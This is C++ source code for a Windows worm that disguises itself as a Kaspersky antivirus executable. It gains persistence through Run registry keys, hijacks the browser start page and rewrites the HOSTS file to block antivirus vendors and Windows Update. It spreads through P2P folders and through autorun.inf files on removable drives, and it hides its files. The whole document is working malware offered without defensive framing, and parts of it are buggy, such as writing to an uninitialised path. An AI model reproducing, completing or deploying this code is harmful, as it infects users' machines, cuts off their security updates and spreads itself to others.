#include<windows.h>
#include<functions.h>
#include<fstream>
 
void InstWorm();
void HomePage();
void hst(void);
void mircSpread();
void p2pCpyWrm();
int FindDrv(const char *drive);
void Hide();
void Q3main();

const char *drive[] = { "a:", "b:", "c:", "d:", 
                        "e:", "f:", "g:", "h:", 
                        "i:", "j:", "k:", "l:", 
                        "m:", "n:", "o:", "p:", 
                        "q:", "r:", "s:", "t:", 
                        "u:", "v:", "w:", "x:", 
                        "y:", "z:", 0
};
 
const char Msg[]="Michigan Sucks!";

void InstWorm()
{
 
  HKEY hKey;
  char sd[MAX_PATH];
  char path[MAX_PATH];
  HMODULE GetH;

  GetH=GetModuleHandle(0);
  GetModuleFileName(GetH,path,sizeof(path));
  GetSystemDirectory(sd,sizeof(sd));
  strcat(sd,"\\Kasperrsky.exe");
  CopyFile(path,sd,FALSE); 

  RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\134\134Microsoft\134\134Windows\134\134CurrentVersion\134\134Run", 0, KEY_SET_VALUE, &hKey);
  RegSetValueEx(hKey,"Q3", 0, REG_SZ, (const unsigned char*)sd, sizeof(sd));
   
  RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Security Center", 0, KEY_SET_VALUE, &hKey);
  RegSetValueEx(hKey, "FirstRun", 0, REG_SZ, (const unsigned char*)sd, sizeof(sd));
   
  RegCloseKey(hKey);

  SetFileAttributes(sd,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM|FILE_ATTRIBUTE_READONLY);
 
}
 
void HomePage()
{
  HKEY  sKey;
  unsigned char regi[50]="www.michigan.com";

  RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\134\134Internet Explorer\134\134Main", &sKey);
  RegSetValueEx(sKey,"Start Page", 0, REG_SZ, regi, sizeof(regi));
  RegCloseKey(sKey);
}

void hst(void)
{
  char hst[MAX_PATH];
  DWORD byte;
  HANDLE hFile;
  BOOL bSuccess;
   
  GetSystemDirectory(hst, sizeof(hst));
  strcat(hst, "\\Drivers\\ETC\\HOSTS");
  const char* buffer = "127.0.0.1 www.mirc.com 127.0.0.1 mirc.com 127.0.0.1 norton.com 127.0.0.1 www.norton.com 127.0.0.1 yahoo.com 127.0.0.1 www.yahoo.com 127.0.0.1 microsoft.com 127.0.0.1 www.microsoft.com 127.0.0.1 windowsupdate.com 127.0.0.1 www.windowsupdate.com 127.0.0.1 www.mcafee.com 127.0.0.1 mcafee.com 127.0.0.1 www.nai.com 127.0.0.1 nai.com 127.0.0.1 www.ca.com 127.0.0.1 ca.com 127.0.0.1 liveupdate.symantec.com 127.0.0.1 www.sophos.com 127.0.0.1 www.google.com 127.0.0.1 google.com";
  hFile = CreateFile(hst, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
  bSuccess = WriteFile ( hFile, buffer, strlen(buffer), &byte, NULL);
  CloseHandle(hFile);       
}
 
void p2pCpyWrm()
{
  char  pathE[0x1600];       
  HMODULE   pathI=GetModuleHandle(NULL);
  GetModuleFileName(pathI,pathE,0x1600);
  CreateDirectory("\\Kasperrsky Anti Virus",NULL);
  CreateDirectory("\\Program Files\\A1",NULL);

  char *CpyWorm[]={
    "\\Program Files\\edonkey2000\\incoming\\WinRaR.exe",
    "\\Kasperrsky Anti Virus\\Kasperrsky.exe",
  };
 
  for(int ix=0; ix < sizeof(char)+6; ix++)
  {
    CopyFile(pathE,ix[CpyWorm],NULL);
  }
}
 
int FindDrv(const char *drive)
{
  char dirX[MAX_PATH];
  char path[MAX_PATH];
  char autorun[MAX_PATH]="autorun.inf";
  ofstream CreAut;
  HMODULE GetQ;
  GetQ=GetModuleHandle(NULL);
  GetModuleFileName(GetQ,path,sizeof(path));
  {
    CreAut.open(dirX,ios_base::out);
    CreAut<<"[AutoRun]"<<endl;
    CreAut<<"open=Kasperrsky.exe"<<endl;
    CreAut<<"shellexecute=Kasperrsky.exe"<<endl;
    CreAut<<"shell\\Auto\\command=Kasperrsky.exe"<<endl;
    CreAut<<"shell=Auto"<<endl;
    CreAut.close();
  }
      
 
  SetFileAttributes(dirX,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM|FILE_ATTRIBUTE_READONLY);
  UINT type= GetDriveType(drive);
  if(type == DRIVE_REMOVABLE)
  {
    strcpy(dirX, drive);
    strcat(dirX, "\\");
    strcat(dirX, "Kasperrsky.exe");
    CopyFile(path, dirX, TRUE); 
    strcpy(dirX, drive);
    strcat(dirX, "\\" );
    strcat(dirX, autorun);
    return 0;
  }
  return 0;
}
 
void Hide()
{
  char WormScript1[]="\\Program Files\\mIRC\\defaults\\scripts\\Q3Bot.zip";
  char WormScript[]="..\\Application Data\\mIRC\\scripts\\Q3Bot.zip";

  SetFileAttributes(WormScript1,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM|FILE_ATTRIBUTE_READONLY);
  SetFileAttributes(WormScript,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM|FILE_ATTRIBUTE_READONLY);
}

void Q3main()
{
  InstWorm();
  HomePage();
  hst();
  p2pCpyWrm();

  for(int ix =0 ; drive[ix]; ix++)
  {
    FindDrv(drive[ix]);
  }

  Hide();
}     
 
int main()
{
    Q3main();
    return EXIT_SUCCESS;
}